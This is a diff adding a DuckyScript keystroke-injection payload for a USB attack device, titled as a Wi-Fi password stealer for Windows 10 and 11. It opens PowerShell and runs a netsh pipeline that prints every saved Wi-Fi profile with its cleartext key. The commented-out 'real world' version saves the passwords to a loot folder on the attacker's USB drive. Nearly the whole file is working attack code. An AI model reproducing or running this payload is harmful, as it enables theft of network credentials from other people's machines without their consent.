@@ -1,0 +1,31 @@
+REM Title: Steels wifi passwords
+REM Author: x0SiN0x
+REM Description: Runs powersell and various commands to pull out wifi details
+REM Target: Windows 10 + 11
+REM Props: N/A
+
+ATTACKMODE HID
+KEYDELAY 0
+DELAY 2000
+
+REM open powershell
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 1500
+
+REM this would normally be stored in a file for later review but to keep it simple we will just output to the screen.
+REM See below though for details on how this could be done
+
+REM pull out our WiFi info
+STRINGLN (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+
+REM what this would ideally look like in a real world scenario
+REM cd into <drivename> labled <drivename>
+REM STRINGLN $bb=(gwmi win32_volume -f 'label=''<drivename>'''|  Select-Object -ExpandProperty DriveLetter)
+REM DELAY 300
+REM STRINGLN cd $bb\loot
+REM DELAY 200
+REM save wifi passwords to a file
+REM file will be named after the computername
+REM STRINGLN (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:computername".txt"
